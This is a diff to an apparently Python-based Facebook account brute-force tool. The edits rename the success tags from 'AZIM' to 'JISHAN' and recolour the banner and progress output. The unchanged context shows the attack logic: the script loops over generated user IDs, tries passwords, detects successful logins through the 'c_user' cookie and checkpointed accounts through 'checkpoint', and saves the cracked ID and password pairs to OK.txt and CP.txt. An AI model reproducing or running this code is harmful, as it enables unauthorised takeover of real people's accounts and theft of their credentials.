@@ -130,9 +130,9 @@ def random_number():
 		os.system('clear')
 		banner()
 		tl = str(len(user))
-		xox(f"{K} TOTAL IDS : {K}{tl}")
-		xox(f"{H} BRUTE HAS BEEN STARTED {N}")
-		xox(f"{B} WAIT AND SEE {H}✘{M}✘ {N}")
+		xox(f"{S} TOTAL IDS : {K}{tl}")
+		xox(f"{S} BRUTE HAS BEEN STARTED {S}")
+		xox(f"{S} WAIT BRO WAIT {S}✘{S}")
 		linex()
 		for guru in user:
 			uid = kode+guru
@@ -193,21 +193,21 @@ def cracker(uid,pwx,tl):
 			if 'c_user' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[65:80]
-				print('\033[1;32m [AZIM-OK] '+uidx+'|'+pasw+'\033[0;97m')
+				print('\033[1;32m [JISHAN-OK] '+uidx+'|'+pasw+'\033[0;97m')
 				open('OK.txt', 'a').write(uidx+'|'+pasw+'\n')
 				oks.append(uidx)
 				break
 			elif 'checkpoint' in fb_cookies:
 				coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
 				uidx = coki[82:97]
-				print('\033[1;31m [AZIM-CP] '+uidx+' | '+pasw+'\033[0;97m')
+				print('\033[1;31m [JISHAN-CP] '+uidx+' | '+pasw+'\033[0;97m')
 				open('CP.txt', 'a').write(uidx+'|'+pasw+'\n')
 				cps.append(uidx)
 				break
 			else:
 				continue
 		loop+=1
-		sys.stdout.write(f"\r {Z}[{H}{loop}{P}-{M}{tl}{Z}] {Z}[{H}{len(oks)}{B}-{K}{len(cps)}{Z}] {Z}[{M}{'{:.1%}'.format(loop/int(tl))}{Z}]  \r"),
+		sys.stdout.write(f"\r {S}[{S}{loop}{S}-{S}{tl}{S}] {S}[{S}{len(oks)}{S}-{S}{len(cps)}{S}] {S}[{S}{'{:.1%}'.format(loop/int(tl))}{S}]  \r"),
 		sys.stdout.flush()
 	except:
 		pass
